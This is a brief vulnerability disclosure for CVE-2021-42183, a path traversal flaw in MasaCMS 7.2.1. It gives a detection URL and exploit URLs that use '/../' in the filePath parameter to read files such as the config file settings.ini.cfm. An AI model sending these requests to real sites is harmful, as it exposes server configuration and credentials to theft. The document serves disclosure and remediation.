# CVE-2021-42183

MasaCMS 7.2.1 is affected by a path traversal vulnerability in /index.cfm/_api/asset/image/.

# Detection

```
If this file is readable it means the vulnerablilty exists.
https://example.com/index.cfm/_api/asset/image/?filePath=/Application.cfc
```


# Exploit

```
https://example.com/index.cfm/_api/asset/image/?filePath=/../<Path>
- Read The Config File
https://example.com/index.cfm/_api/asset/image/?filePath=/../config/settings.ini.cfm 
```

## Tested On 
MasaCMS 7.2.1

## Vendor

http://www.masacms.com

https://github.com/MasaCMS/MasaCMS
https://github.com/MasaCMS/MasaCMS/blob/01e0636db0ea4c132906724e1b0772c86e263ada/core/mura/content/file/fileManager.cfc#L368


## Discoverd By:

Rawi And BassamAssiri.
